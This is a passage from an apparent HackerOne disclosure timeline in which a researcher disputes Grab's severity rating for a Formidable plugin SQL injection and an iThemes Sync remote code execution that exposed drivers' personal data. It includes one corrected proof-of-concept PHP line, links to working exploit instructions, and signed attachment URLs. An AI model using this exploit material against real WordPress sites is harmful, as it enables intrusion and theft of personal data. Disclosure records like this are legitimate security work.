numbers, as we know from another bug on this site, which by the way wasn't considered critical by you either). So it seems that based on your stated policy, this issue was critical, even without the remote code execution.\n","markdown_message":"\u003cp\u003eYour policy page says not only that drivegrab.com is in scope and \u0026quot;critical\u0026quot;, i.e. one of the most important targets. Did I misunderstand? Also from the policy page one could understand that disclosure of personal information (licence numbers explicitly mentioned) would be a critical issue. This bug gave the attacker access to this information (drivers\u0026#39; personal information including licence numbers, as we know from another bug on this site, which by the way wasn\u0026#39;t considered critical by you either). So it seems that based on your stated policy, this issue was critical, even without the remote code execution.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-19T03:12:26.790Z","updated_at":"2017-10-19T03:13:10.132Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2083202,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is so clearly wrong that I'll make a mediation request. It's worrying if HackerOne really endorses this kind of way of doing business. I think there should be a wider discussion about the ethics on the bounty offerers' behalf. For me, these problems are the main reason I don't do more bug bounties (I just had an over a year's break). From what I've heard, I'm not the only one. More experts will participate bug bounties if they can trust that their work will be compensated as promised and the reports are treated reasonably. Less of them will participate if this practice continues.\n","markdown_message":"\u003cp\u003eThis is so clearly wrong that I\u0026#39;ll make a mediation request. It\u0026#39;s worrying if HackerOne really endorses this kind of way of doing business. I think there should be a wider discussion about the ethics on the bounty offerers\u0026#39; behalf. For me, these problems are the main reason I don\u0026#39;t do more bug bounties (I just had an over a year\u0026#39;s break). From what I\u0026#39;ve heard, I\u0026#39;m not the only one. More experts will participate bug bounties if they can trust that their work will be compensated as promised and the reports are treated reasonably. Less of them will participate if this practice continues.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-19T04:40:00.040Z","updated_at":"2017-10-19T04:40:00.040Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2086934,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is in fact true that website is in scope, mea cupla. Jouko we understand your point of view but we have rewarded your finding according to the data impacted and we believe this bounty is fair enough regarding the number of personal data involved.\n\nTo be as fair and objective as possible we are waiting for the hackone team reply.","markdown_message":"\u003cp\u003eIt is in fact true that website is in scope, mea cupla. Jouko we understand your point of view but we have rewarded your finding according to the data impacted and we believe this bounty is fair enough regarding the number of personal data involved.\u003c/p\u003e\n\n\u003cp\u003eTo be as fair and objective as possible we are waiting for the hackone team reply.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-20T01:48:42.731Z","updated_at":"2017-10-20T01:48:42.731Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2087342,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As you know, the database contained PII (names, email addresses, mobile numbers, licence plates) of almost ██████████ drivers, and that was just one of the many forms stored in the Formidable database. How many customers or drivers would have to be affected for a critical impact? 100,000? Million?\n\nYou no longer seem to dispute that remote code execution was also possible and the server is in fact in scope and in the most critical tier. Yet that hasn't for some reason been reflected in the severity classification.\n\nHave you actually read your own policy page? The reality of handling this bug is seriously out of sync with it. If you have no intention to follow the policies outlined on the page, then you are intentionally deceiving researchers to get free workforce. I strongly doubt that HackerOne would endorse this kind of activity. A business relying on trust and ethics couldn't operate like that.\n\nThis makes you wonder, if this isn't considered critical, WHAT is? It is actually difficult to imagine a more serious vulnerability affecting a single web service.\n\nThe reason I had to provide further information later is that you immediately classified this as critical, within minutes of the report. I thought it was obvious and it didn't cross my mind that you'd start disputing this later. The medium-\u003ehigh classification came a week later, for reasons that nobody still seems to know, and apparently because of misunderstandings about the impact and scope.\n","markdown_message":"\u003cp\u003eAs you know, the database contained PII (names, email addresses, mobile numbers, licence plates) of almost ██████████ drivers, and that was just one of the many forms stored in the Formidable database. How many customers or drivers would have to be affected for a critical impact? 100,000? Million?\u003c/p\u003e\n\n\u003cp\u003eYou no longer seem to dispute that remote code execution was also possible and the server is in fact in scope and in the most critical tier. Yet that hasn\u0026#39;t for some reason been reflected in the severity classification.\u003c/p\u003e\n\n\u003cp\u003eHave you actually read your own policy page? The reality of handling this bug is seriously out of sync with it. If you have no intention to follow the policies outlined on the page, then you are intentionally deceiving researchers to get free workforce. I strongly doubt that HackerOne would endorse this kind of activity. A business relying on trust and ethics couldn\u0026#39;t operate like that.\u003c/p\u003e\n\n\u003cp\u003eThis makes you wonder, if this isn\u0026#39;t considered critical, WHAT is? It is actually difficult to imagine a more serious vulnerability affecting a single web service.\u003c/p\u003e\n\n\u003cp\u003eThe reason I had to provide further information later is that you immediately classified this as critical, within minutes of the report. I thought it was obvious and it didn\u0026#39;t cross my mind that you\u0026#39;d start disputing this later. The medium-\u0026gt;high classification came a week later, for reasons that nobody still seems to know, and apparently because of misunderstandings about the impact and scope.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-20T08:05:29.027Z","updated_at":"2017-11-15T09:42:39.678Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2143035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In my discussions with HackerOne it has become even more clear that there was no legitimate reason to downgrade the severity of this bug. Several of the Formidable bugs exactly fulfill your specific criteria of \"critical\" and this is probably the clearest case.\n\nI'll be releasing a write-up about these bugs tomorrow. My blog posts are mainly about the technical side but I usually also briefly mention the bug bounty process. In this case maybe not so briefly because there has been so many conflicting explanations for the non-critical severity assessment.\n\nThis case came up already in a discussion with a reporter already almost 3 weeks ago (it was about other vulnerability findings - I didn't mention GrabTaxi or the bounty problems because at that point I had no reason to suspect this would happen, it was still \"critical\" at the time). He asked me to give a heads-up when I'm publishing the 0-days. They affected over 200,000 active WordPress installations and probably millions of people so I'd expect there may be some media attention.\n\nIt seems also likely that the bounty process will raise some eyebrows to say the least. Unless you object I'll give the media your contact details so you can equally present your view of what happened.\n\nMy view is that your bounty assessment was not done in good faith. The severity was downgraded without a valid reason to avoid paying the appropriate bounty. This was justified with several falsehoods made up by you and HackerOne.\n\nThe last explanation from HackerOne was maybe the most ludicrous: that third party software like WordPress plugins are out of scope and I should't have received any bounty at all! I thought I couldn't be surprised anymore but yes, I was again surprised at how low a supposedly reputable company can go. This rationale was never mentioned before and in fact WordPress plugin vulnerabilities are mentioned as an example of a valid bug on your policy page.\n\nYou've been very determined to harm my livelihood. I don't understand how you expect anyone to accept that. Normally this would be basis for legal action. It may be technically legal in the bug bounty context but not any more ethical. The least I can do is to warn other researchers about this program.\n","markdown_message":"\u003cp\u003eIn my discussions with HackerOne it has become even more clear that there was no legitimate reason to downgrade the severity of this bug. Several of the Formidable bugs exactly fulfill your specific criteria of \u0026quot;critical\u0026quot; and this is probably the clearest case.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll be releasing a write-up about these bugs tomorrow. My blog posts are mainly about the technical side but I usually also briefly mention the bug bounty process. In this case maybe not so briefly because there has been so many conflicting explanations for the non-critical severity assessment.\u003c/p\u003e\n\n\u003cp\u003eThis case came up already in a discussion with a reporter already almost 3 weeks ago (it was about other vulnerability findings - I didn\u0026#39;t mention GrabTaxi or the bounty problems because at that point I had no reason to suspect this would happen, it was still \u0026quot;critical\u0026quot; at the time). He asked me to give a heads-up when I\u0026#39;m publishing the 0-days. They affected over 200,000 active WordPress installations and probably millions of people so I\u0026#39;d expect there may be some media attention.\u003c/p\u003e\n\n\u003cp\u003eIt seems also likely that the bounty process will raise some eyebrows to say the least. Unless you object I\u0026#39;ll give the media your contact details so you can equally present your view of what happened.\u003c/p\u003e\n\n\u003cp\u003eMy view is that your bounty assessment was not done in good faith. The severity was downgraded without a valid reason to avoid paying the appropriate bounty. This was justified with several falsehoods made up by you and HackerOne.\u003c/p\u003e\n\n\u003cp\u003eThe last explanation from HackerOne was maybe the most ludicrous: that third party software like WordPress plugins are out of scope and I should\u0026#39;t have received any bounty at all! I thought I couldn\u0026#39;t be surprised anymore but yes, I was again surprised at how low a supposedly reputable company can go. This rationale was never mentioned before and in fact WordPress plugin vulnerabilities are mentioned as an example of a valid bug on your policy page.\u003c/p\u003e\n\n\u003cp\u003eYou\u0026#39;ve been very determined to harm my livelihood. I don\u0026#39;t understand how you expect anyone to accept that. Normally this would be basis for legal action. It may be technically legal in the bug bounty context but not any more ethical. The least I can do is to warn other researchers about this program.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-08T14:55:24.355Z","updated_at":"2017-11-08T14:55:24.355Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2146306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI, some unexpected family business came up and I can't finish the write-up today (I'll include all Formidable bugs + iThemes Sync trick in the post so it's quite long). I'll probably have to delay it until Monday.","markdown_message":"\u003cp\u003eFYI, some unexpected family business came up and I can\u0026#39;t finish the write-up today (I\u0026#39;ll include all Formidable bugs + iThemes Sync trick in the post so it\u0026#39;s quite long). I\u0026#39;ll probably have to delay it until Monday.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-09T15:16:03.990Z","updated_at":"2017-11-09T15:16:03.990Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2164461,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-17T06:24:36.010Z","updated_at":"2017-11-17T06:24:36.010Z","first_to_agree":true,"actor":{"username":"grabsecurity","cleared":false,"url":"/grabsecurity","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2164469,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-17T06:28:14.400Z","updated_at":"2017-11-17T06:28:14.400Z","actor":{"username":"grabsecurity","cleared":false,"url":"/grabsecurity","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2165349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The iThemes-Sync RCE vector can't be a matter of opinion. It's obvious from viewing the code, and anyone can install the plugin and replicate the exploit with the script above. You asked me to replicate this on your server, then refused to give me the key to do so. This looks very bad to me.\n\nYou have specified this website is *critical* and PII access a critical vulnerability. The SQL injection grants access to *all* data in the website's database. Just one of the forms I checked contained names, email addresses, mobile numbers, and licence plate numbers of almost ████ drivers (why was this number censored above?) and other forms contained more. This is in addition to all other data on the system, like employee accounts and order tracking, customer, and payments data.\n\nIf the system in fact does not contain any critical information, then the classification as critical seems wrong and can be seen as deceptive by researchers who trust your policy page.","markdown_message":"\u003cp\u003eThe iThemes-Sync RCE vector can\u0026#39;t be a matter of opinion. It\u0026#39;s obvious from viewing the code, and anyone can install the plugin and replicate the exploit with the script above. You asked me to replicate this on your server, then refused to give me the key to do so. This looks very bad to me.\u003c/p\u003e\n\n\u003cp\u003eYou have specified this website is \u003cem\u003ecritical\u003c/em\u003e and PII access a critical vulnerability. The SQL injection grants access to \u003cem\u003eall\u003c/em\u003e data in the website\u0026#39;s database. Just one of the forms I checked contained names, email addresses, mobile numbers, and licence plate numbers of almost ████ drivers (why was this number censored above?) and other forms contained more. This is in addition to all other data on the system, like employee accounts and order tracking, customer, and payments data.\u003c/p\u003e\n\n\u003cp\u003eIf the system in fact does not contain any critical information, then the classification as critical seems wrong and can be seen as deceptive by researchers who trust your policy page.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-17T15:09:41.297Z","updated_at":"2017-11-18T01:45:24.195Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2165979,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For some reason you've also censored the string \"user_email\" is the PoC code. It's not sensitive information but  prevents people from independently checking whether the exploit script works or not. \n\nCorrected line:\n~~~~ php\n$newuser[0][0]['user_email']='foo@foo.com';\n~~~~\n\nThere's also a working example at https://klikki.fi/ithemes-sync.txt .\n","markdown_message":"\u003cp\u003eFor some reason you\u0026#39;ve also censored the string \u0026quot;user_email\u0026quot; is the PoC code. It\u0026#39;s not sensitive information but  prevents people from independently checking whether the exploit script works or not. \u003c/p\u003e\n\n\u003cp\u003eCorrected line:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_email\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;foo@foo.com\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere\u0026#39;s also a working example at \u003ca title=\"https://klikki.fi/ithemes-sync.txt\" href=\"/redirect?url=https%3A%2F%2Fklikki.fi%2Fithemes-sync.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://klikki.fi/ithemes-sync.txt\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e .\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-17T18:18:31.047Z","updated_at":"2017-11-17T18:18:57.436Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2168438,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The summary says:\n\n\u003e we figured out that those two values are not enough for reproducing the RCE\n\nHackerOne co-founder Alex Rice notes on [Twitter](https://twitter.com/senorarroz/status/931988860069801985) that the plugin \"of course\" works as I described, i.e. the two values, stored in plain text, are enough to achieve remote code execution.\n\nAll of the plugin's core functionality happens through this interface and this authentication. iThemes's servers use this interface to communicate with Grab's server. If they had incompatible authentication methods, this software would do basically nothing but malfunction.\n\nThe suggested possibility that someone would have implemented an alternative authentication method between Grab and iThemes, neither being aware of it, before anybody knew about this weakness, seems nonsensical. Another misunderstanding or error on Grab's behalf seems a much more likely scenario.\n\nI've added a step-by-step guide for reproducing the RCE in the end of this post: https://klikki.fi/adv/formidable.html\n\nWe can all review the code. There should be no room for speculation about what it does or how it works.\n","markdown_message":"\u003cp\u003eThe summary says:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ewe figured out that those two values are not enough for reproducing the RCE\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eHackerOne co-founder Alex Rice notes on \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fsenorarroz%2Fstatus%2F931988860069801985\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eTwitter\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that the plugin \u0026quot;of course\u0026quot; works as I described, i.e. the two values, stored in plain text, are enough to achieve remote code execution.\u003c/p\u003e\n\n\u003cp\u003eAll of the plugin\u0026#39;s core functionality happens through this interface and this authentication. iThemes\u0026#39;s servers use this interface to communicate with Grab\u0026#39;s server. If they had incompatible authentication methods, this software would do basically nothing but malfunction.\u003c/p\u003e\n\n\u003cp\u003eThe suggested possibility that someone would have implemented an alternative authentication method between Grab and iThemes, neither being aware of it, before anybody knew about this weakness, seems nonsensical. Another misunderstanding or error on Grab\u0026#39;s behalf seems a much more likely scenario.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve added a step-by-step guide for reproducing the RCE in the end of this post: \u003ca title=\"https://klikki.fi/adv/formidable.html\" href=\"/redirect?url=https%3A%2F%2Fklikki.fi%2Fadv%2Fformidable.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://klikki.fi/adv/formidable.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can all review the code. There should be no room for speculation about what it does or how it works.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-19T11:48:00.198Z","updated_at":"2017-11-19T11:53:46.793Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2173860,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just for the record, I requested public disclosure of this report on October 17. The request has since then disappeared from the timeline. It is present in my screenshots and saved versions of this page at least until November 8. It was probably removed at the same time with other information like the number of exposed PII entries and partial censoring of PoC code.\n{F241341}\n\nI think this case is a good example of the importance of transparency when dealing with vulnerability information. There are [reports](https://wpvulndb.com/vulnerabilities/8945) that these bugs were exploited in the wild after Strategy11 fixed them on GitHub, but before I published my write-up (against repeated demands and warnings from H1) on November 13.\n\nServers were compromised by exploiting the Formidable shortcode problem described in this report, in conjunction with a weakness in another WordPress plugin, apparently in late October. Of course those two compromised sites mentioned on WPVulnDB almost certainly are not the only cases. It seems probable that had my disclosure request been promptly accepted, or without the strong demands of non-disclosure until November 13, some or all of these incidents could have been avoided.","markdown_message":"\u003cp\u003eJust for the record, I requested public disclosure of this report on October 17. The request has since then disappeared from the timeline. It is present in my screenshots and saved versions of this page at least until November 8. It was probably removed at the same time with other information like the number of exposed PII entries and partial censoring of PoC code.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"nov8.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/241/341/8b75ba68148a8ae2200e696afdd4e93064d054bf/nov8.png?response-content-disposition=attachment%3B%20filename%3D%22nov8.png%22%3B%20filename%2A%3DUTF-8%27%27nov8.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTGH7D7G4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052017Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF3bZwIuJVbBath9RBAagycfg6N290U9MaBDwIhhNMqjAiEA5QJFTUjUu%2BelINQ8mBSRMtPAJunx%2FkQdIQYoGvxoAn0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDKWCtAdrSoxlUzEo5CqRA2KbCK2gb0cQjXvMxG7rxH%2BqkR2WSbvaIs%2FZazFNKw1eZW2WrZTy5Q04uSJp6R8rbsBzRSLIFhyP9QTQMq5P15qLdwXnZbOxNVoADzWwgfUfGt%2BOwI%2BEjM3ovXNd1aGU0Ee1TBGk3LBN3uQ8ppV7Xii57PrmCtM4dm9usXbAaaa8f8QiQFPH1YTkHf%2FPe1cgMlFNJFqSrmu3ZMinUb9pxpphywkYT29wP%2Fak4Sy9A3St63iqnDzi8wrdG9%2FGdB7M03pSeaVTcH99G5j%2FqMpFpJxYN8TNlglA1OWgt7QlVOqnq65zCp4szGmwzF1FrjkS%2Bp3wB27lGxlw0v79ozRdwRBFBFvrSgSeToK8vpEBIlnO4uogSsVneM6zoYfyQw3%2F6HqcPg9mVWJmJS4QLMpQTMd%2FMeYn%2F%2Ffl2Vt%2Bb0X2rNtQPeWMGpzHpq6XAiCjZ%2F33fJuN%2B3j9Lmo023GSXKu%2B%2FkZTBp3waVREDqE%2BNeB30X8ZT5%2BW0bqtpGbJe8ig5jtSZzprCWg9v84Utvz3uaa%2Bcjz7MJPPqv8FOusBEHCYkRstnRk5lzIXoX3CRWjAJcL61b1gmhmecG%2Fow23IgJkGaQ5%2B%2FkCWvGrt4rLn9BlUKR84X6ifbCLPwMQevITvtVqg1wdT%2FzOjUyHnqnZVOyLFoqLXk9MNjw1VTb%2FmSNp%2Bd5NsBD5KiAAd50U1%2F1jl5yoSrl0DpEi6Yzv0bFigmUQPNRZeTImBJ2V75RxXBbDSoevWuBT70W%2F8%2BsoyTMqti7McilmsidA1BnI1f8HDTyMQGIoexlo%2BO7e5AiNtCUboKL2ZiertWXe5cEVF9mAVgHpVtz7pIIElyyZjsKslJzP%2B5WRhYUkMYg%3D%3D\u0026amp;X-Amz-Signature=9945f5a4ec7fbe5a13d3cbbbadaa861a308dbf1dae9849d203c3cecf0716e2fe\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/241/341/8b75ba68148a8ae2200e696afdd4e93064d054bf/nov8.png?response-content-disposition=attachment%3B%20filename%3D%22nov8.png%22%3B%20filename%2A%3DUTF-8%27%27nov8.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTGH7D7G4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052017Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF3bZwIuJVbBath9RBAagycfg6N290U9MaBDwIhhNMqjAiEA5QJFTUjUu%2BelINQ8mBSRMtPAJunx%2FkQdIQYoGvxoAn0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDKWCtAdrSoxlUzEo5CqRA2KbCK2gb0cQjXvMxG7rxH%2BqkR2WSbvaIs%2FZazFNKw1eZW2WrZTy5Q04uSJp6R8rbsBzRSLIFhyP9QTQMq5P15qLdwXnZbOxNVoADzWwgfUfGt%2BOwI%2BEjM3ovXNd1aGU0Ee1TBGk3LBN3uQ8ppV7Xii57PrmCtM4dm9usXbAaaa8f8QiQFPH1YTkHf%2FPe1cgMlFNJFqSrmu3ZMinUb9pxpphywkYT29wP%2Fak4Sy9A3St63iqnDzi8wrdG9%2FGdB7M03pSeaVTcH99G5j%2FqMpFpJxYN8TNlglA1OWgt7QlVOqnq65zCp4szGmwzF1FrjkS%2Bp3wB27lGxlw0v79ozRdwRBFBFvrSgSeToK8vpEBIlnO4uogSsVneM6zoYfyQw3%2F6HqcPg9mVWJmJS4QLMpQTMd%2FMeYn%2F%2Ffl2Vt%2Bb0X2rNtQPeWMGpzHpq6XAiCjZ%2F33fJuN%2B3j9Lmo023GSXKu%2B%2FkZTBp3waVREDqE%2BNeB30X8ZT5%2BW0bqtpGbJe8ig5jtSZzprCWg9v84Utvz3uaa%2Bcjz7MJPPqv8FOusBEHCYkRstnRk5lzIXoX3CRWjAJcL61b1gmhmecG%2Fow23IgJkGaQ5%2B%2FkCWvGrt4rLn9BlUKR84X6ifbCLPwMQevITvtVqg1wdT%2FzOjUyHnqnZVOyLFoqLXk9MNjw1VTb%2FmSNp%2Bd5NsBD5KiAAd50U1%2F1jl5yoSrl0DpEi6Yzv0bFigmUQPNRZeTImBJ2V75RxXBbDSoevWuBT70W%2F8%2BsoyTMqti7McilmsidA1BnI1f8HDTyMQGIoexlo%2BO7e5AiNtCUboKL2ZiertWXe5cEVF9mAVgHpVtz7pIIElyyZjsKslJzP%2B5WRhYUkMYg%3D%3D\u0026amp;X-Amz-Signature=9945f5a4ec7fbe5a13d3cbbbadaa861a308dbf1dae9849d203c3cecf0716e2fe\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI think this case is a good example of the importance of transparency when dealing with vulnerability information. There are \u003ca href=\"/redirect?url=https%3A%2F%2Fwpvulndb.com%2Fvulnerabilities%2F8945\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ereports\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that these bugs were exploited in the wild after Strategy11 fixed them on GitHub, but before I published my write-up (against repeated demands and warnings from H1) on November 13.\u003c/p\u003e\n\n\u003cp\u003eServers were compromised by exploiting the Formidable shortcode problem described in this report, in conjunction with a weakness in another WordPress plugin, apparently in late October. Of course those two compromised sites mentioned on WPVulnDB almost certainly are not the only cases. It seems probable that had my disclosure request been promptly accepted, or without the strong demands of non-disclosure until November 13, some or all of these incidents could have been avoided.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-21T19:24:40.275Z","updated_at":"2017-11-21T19:24:40.275Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":241341,"filename":"nov8.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/241/341/8b75ba68148a8ae2200e696afdd4e93064d054bf/nov8.png?response-content-disposition=attachment%3B%20filename%3D%22nov8.png%22%3B%20filename%2A%3DUTF-8%27%27nov8.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTGH7D7G4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052017Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF3bZwIuJVbBath9RBAagycfg6N290U9MaBDwIhhNMqjAiEA5QJFTUjUu%2BelINQ8mBSRMtPAJunx%2FkQdIQYoGvxoAn0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDKWCtAdrSoxlUzEo5CqRA2KbCK2gb0cQjXvMxG7rxH%2BqkR2WSbvaIs%2FZazFNKw1eZW2WrZTy5Q0